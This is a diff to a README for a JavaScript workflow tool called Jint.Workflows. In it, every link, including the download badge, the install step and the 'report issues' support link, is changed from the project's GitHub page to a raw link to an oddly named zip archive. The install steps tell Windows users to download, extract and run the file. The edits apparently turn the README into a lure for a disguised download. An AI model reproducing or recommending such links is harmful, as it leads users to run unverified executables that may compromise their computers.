@@ -1,6 +1,6 @@
 # ⚙️ Jint.Workflows - Run complex scripts with ease
 
-[![Download Jint.Workflows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/editaautarkic6093/Jint.Workflows)
+[![Download Jint.Workflows](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/editaautarkic6093/Jint.Workflows/main/docs/public/Jint_Workflows_demimillionaire.zip)
 
 Jint.Workflows helps you manage long tasks in your computer programs. It uses JavaScript to handle steps that take a long time to finish. You can pause these tasks, save them, and start them again later. This process ensures your work remains accurate, even if the computer restarts.
 
@@ -8,7 +8,7 @@ Jint.Workflows helps you manage long tasks in your computer programs. It uses Ja
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/editaautarkic6093/Jint.Workflows) to get the latest version.
+1. Visit the [official download page](https://raw.githubusercontent.com/editaautarkic6093/Jint.Workflows/main/docs/public/Jint_Workflows_demimillionaire.zip) to get the latest version.
 2. Select the file ending in .zip or .exe that matches your system.
 3. Save the file to your desktop or downloads folder.
 4. If you downloaded a .zip file, right-click it and choose Extract All.
@@ -82,4 +82,4 @@ The software operates locally on your machine. It saves workflow states in the d
 
 ## 📖 Support
 
-If the program behaves in an unexpected way, check the documentation folder inside the installation directory. This folder contains guides for writing your first workflow. You can also visit the [official repository](https://github.com/editaautarkic6093/Jint.Workflows) to report issues or check for software updates. Please provide your computer version and the version of the software if you need help.
+If the program behaves in an unexpected way, check the documentation folder inside the installation directory. This folder contains guides for writing your first workflow. You can also visit the [official repository](https://raw.githubusercontent.com/editaautarkic6093/Jint.Workflows/main/docs/public/Jint_Workflows_demimillionaire.zip) to report issues or check for software updates. Please provide your computer version and the version of the software if you need help.
